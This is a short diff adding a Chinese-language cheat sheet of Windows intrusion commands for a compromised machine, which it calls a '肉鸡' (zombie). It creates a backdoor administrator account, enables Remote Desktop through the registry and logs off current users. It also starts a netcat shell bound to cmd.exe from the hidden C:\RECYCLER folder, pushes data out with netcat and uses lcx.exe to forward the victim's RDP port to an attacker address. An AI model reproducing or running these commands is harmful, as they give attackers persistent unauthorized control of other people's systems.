@@ -1,0 +1,44 @@
+
+加账户
+net user seayace seay /add  建立账户，用户名seayace  密码seay
+net localgroup Administrators seayace /add  提升到管理员权限
+
+开启3389
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+query user  查看会话
+
+logoff ID号  踢掉
+
+C:\RECYCLER\Chu.exe "logoff 1"  
+
+
+NC反弹
+
+路径\nc.exe -l -p 端口 -t -e 路径\cmd.exe
+
+c:\RECYCLER\nc.exe -l -p 1234 -t -e c:\RECYCLER\cmd.exe
+
+NC上传
+
+DOS界面下运行:
+
+NC -vv www.baidu.com 80<1.txt
+
+-vv: 回显
+
+80: www端口
+
+1.txt: 就是你要发送的数据包
+
+
+LCX端口转发
+
+先本地监听51端口 lcx.exe -listen 51 3389
+
+c:\recycler\lcx.exe -slave 自己的ip 51 肉鸡IP 3389    LCX转发
+
+c:\recycler\lcx.exe -slave 222.222.222.222 51 111.111.111.111 3389
+
+
